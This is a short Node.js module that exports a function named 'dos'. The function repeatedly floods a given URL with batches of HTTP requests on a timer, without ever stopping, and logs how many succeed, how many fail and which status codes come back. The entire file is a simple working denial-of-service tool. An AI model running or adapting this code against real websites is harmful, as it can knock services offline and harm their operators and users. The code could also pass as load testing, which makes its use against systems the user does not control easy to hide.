const req = require('request');

const dos = (url, qty, ms) => {
    let err = 0, ok = 0;
    let counter = 1;
    let statusCodes = {};

    setInterval(() => {

        for (let i = 0; i < qty; i++) {
            req(url, (error, response) => {
                if (error) {
                    err++;
                } else {
                    ok++;
                    const statusCode = response.statusCode;
                    
                    if (statusCodes[statusCode]) {
                        statusCodes[statusCode]++;
                    } else {
                        statusCodes[statusCode] = 1;
                    }
                }
            });
        }

        const statusCodesString = Object.entries(statusCodes)
            .map(([code, count]) => `${code}: ${count}`)
            .join(', ');

        console.log(`${counter}: ${url} ${ok} ${err} Status Codes: ${statusCodesString}`);
        
        counter++;
        err = ok = 0;
        statusCodes = {};
    }, ms);
};

module.exports = dos;
